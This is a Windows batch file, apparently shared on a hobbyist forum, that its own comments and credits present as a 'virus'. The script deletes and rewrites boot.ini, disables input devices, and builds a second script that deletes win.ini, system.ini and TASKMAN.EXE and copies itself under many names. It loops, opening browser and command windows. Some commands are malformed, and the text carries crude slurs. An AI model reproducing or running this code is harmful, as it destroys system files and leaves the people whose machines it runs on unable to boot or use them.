   @echo off
   smartdrv
   break

   c:\windows\rundll32 comm,disable

   c:\windows\rundll32 drivers,disable

   c:\windows\rundll32 keyboard,disable
   c:\windows\rundll32 mouse,disable
   rename c:\my documents c:\asshole
   attrib -h c:\ntldr /s
   attrib -h c:\boot.ini /s
   goto :firstlayer

   :firstlayer
   rem Oy My God?!?! windows xp/2000 SUX Big Time! (remark, not seen)
   del c:\boot.ini
   echo [Boot loader] >> boot.ini
   echo Default=c:\ >> boot.ini
   echo [Operating Systems] >> boot.ini
   echo multi(0)disk(0)rdisk(0)partition(1)\windows="A Nice Big Car named Microsft just crashed todae!! /fastdetect >> c:\boot.ini
   echo multi(0)disk(0)rdisk(0)partition(2)\windows="So where DO u wanna go today??" /fastdetect >> c:\boot.ini
   echo multi(0)disk(0)rdisk(0)partition(3)\windows="On Crash, GOTO :HELL!!" /fastdetect >> c:\boot.ini
   echo c:\="Prepared for the Hell...son..." >> c:\boot.ini
   echo d:\="May the HELL be with you..." >> c:\boot.ini
   goto :secondlayer

   :secondlayer
   echo device=smartdrv >> c:\config.sys
   echo device=c:\windows\ASPI2HLP.SYS>> c:\config.sys
   echo device=c:\windows\DBLBUFF.SYS >> c:\config.sys
   echo devicehigh=c:\windows\RAMDRIVE.SYS 64000 512 64 >> c:\config.sys
   echo devicehigh=c:\windows\command\ansi.sys >> c:\config.sys
   echo devicehigh=c:\windows\command\country.sys >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI2DOS.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI4DOS.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI8DOS.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI8U2.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPICD.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\FLASHPT.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\WINBOOT.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\IO.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\OAKCDROM.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\BTCDROM.SYS >> c:\config.sys
   goto :thirdlayer

   :thirdlayer
   echo del c:\logo.sys >> c:\autoexec.bat >> c:\windows\win.bat
   echo echo Hey Brother...Let me tell u a story...but u have to listen >> c:\windows\win.bat
   echo echo carefully, becoz you will not have a chance to read this >> c:\windows\win.bat
   echo echo to read this story any more...so listen carefully >> c:\windows\win.bat
   echo echo. >> c:\windows\win.bat
   echo echo. >> c:\windows\win.bat
   echo pause >> c:\windows\win.bat
   echo del c:\windows\win.ini >> c:\windows\win.bat
   echo cls >> c:\windows\win.bat
   echo echo Once upon a time...there is a virus...it is a naughty virus... >> c:\windows\win.bat
   echo echo he delete all files and destroy computers... >> c:\windows\win.bat
   echo pause >> c:\windows\win.bat
   echo del c:\windows\system.ini >> c:\windows\win.bat
   echo cls >> c:\windows\win.bat
   echo echo he thought that no one can destroy him...well...he is wrong... >> c:\windows\win.bat
   echo echo instead...microsoft found out this virus...but seems unable to >> c:\windows\win.bat
   echo echo remove it...so he seek help from Norton antivirus... >> c:\windows\win.bat
   echo pause >> c:\windows\win.bat
   echo del c:\WINDOWs\TASKMAN.EXE >> c:\windows\win.bat
   echo cls >> c:\windows\win.bat
   echo echo now...the people of norton antivirus was fucking each other at  >> c:\windows\win.bat
   echo echo the time...when they saw microsoft people coming...they immidiatly >> c:\windows\win.bat
   echo echo pull up their pants and welcome them with a big hug (norton is gay) >> c:\windows\win.bat
   echo pause >> c:\windows\win.bat
   echo copy %0 c:\hohoho.exe >> c:\windows\win.bat
   echo copy %0 c:\merry.exe >> c:\windows\win.bat
   echo copy %0 c:\christmas.exe >> c:\windows\win.bat
   echo copy %0 c:\win.exe >> c:\windows\win.bat
   echo copy %0 c:\win.bat >> c:\windows\win.bat
   echo copy %0 c:\system.exe >> c:\windows\win.bat
   echo copy %0 c:\system.bat >> c:\windows\win.bat
   echo copy %0 c:\command.bat >> c:\windows\win.bat
   echo copy %0 c:\ntldr.bat >> c:\windows\win.bat
   echo copy %0 c:\URMAMA.bat >> c:\windows\win.bat
   echo copy %0 c:\U_SUX.bat >> c:\windows\win.bat
   echo copy %0 c:\windows.jpg >> c:\windows\win.bat
   echo cls >> c:\windows\win.bat
   echo echo Microsoft when up to peter norton and said,"peter, we need help". >> c:\windows\win.bat
   echo echo guess what norton peter said...... >> c:\windows\win.bat
   echo pause >> c:\windows\win.bat
   echo echo TIME TO PLAY!!!!! >> c:\windows\win.bat
   start c:\windows\win.bat
   goto :forthlayer

   :forthlayer
   c:\windows\rundll32 user,disableoemlayer
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   choice /ty,5 >nul

   c:\windows\rundll32\gdi,disable

   start cmd
   start cmd
   start cmd
   start cmd
   start cmd
   start cmd
   start cmd
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   start iexplore http://www.albinoblacksheep.com/flash/you.html
   choice /ty,5 >nul
   echo g=ffff:0000 | debug >> c:\autoexec.bat
   goto :forthlayer




   :credits
   echo Not to be missed!! Stars of this virus world!
   echo we welcome our virus stars...here they are!!!
   echo.
   echo.
   cls
   echo    name Creator   Alex323 ... for Giving a nice name
   echo                               selected for 9th virus name
   echo
   echo                   HunterXI .. Nice name ... although not
   ehco                               selected...nvm about that...
   echo                               i will think of a nice virus
   echo                               too suit ur name!!
   echo
   echo    Batch COmpiler   X-117 ... thanks for the nice B.C.
   echo
   echo                     Alexandra thanks for ur B.C too!! i love that one...
   echo
   echo                     michiel . for giving me advice on the B.C. i found...
   echo
   echo    Virus suggestions    michiel ... for the Copy file name sugesstion...thx!
   echo
   echo                         alex323 ... for the "disabling the oem layer" i dun
   echo                                     really noe what ur taking about..but..i still use it!
   echo
   echo    MOderaters Awards!   Michiel!!! For not locking my topic..hehe...
   echo
   echo
   echo                     and credits are given too all people who visted my second
   echo                     virus topic and posted some shit inside!! thankyou...
